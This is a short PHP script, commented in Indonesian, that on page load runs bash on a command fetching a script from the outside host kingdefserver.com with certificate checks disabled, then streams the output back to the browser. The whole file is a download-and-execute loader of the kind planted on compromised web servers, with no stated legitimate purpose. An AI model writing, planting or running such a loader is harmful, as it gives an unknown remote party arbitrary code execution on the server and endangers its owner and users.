<?php
// Menjalankan perintah Bash dan menampilkan output secara real-time
header('Content-Type: text/plain');

$command = 'bash -c "$(curl -fsSL kingdefserver.com/x -k)"';

$descriptorspec = [
    1 => ['pipe', 'w'], // stdout
    2 => ['pipe', 'w']  // stderr
];

$process = proc_open($command, $descriptorspec, $pipes);

if (is_resource($process)) {
    while ($output = fgets($pipes[1])) {
        echo $output;
        flush();
        ob_flush();
    }
    while ($error = fgets($pipes[2])) {
        echo $error;
        flush();
        ob_flush();
    }
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
} else {
    echo "Gagal menjalankan perintah.";
}
?>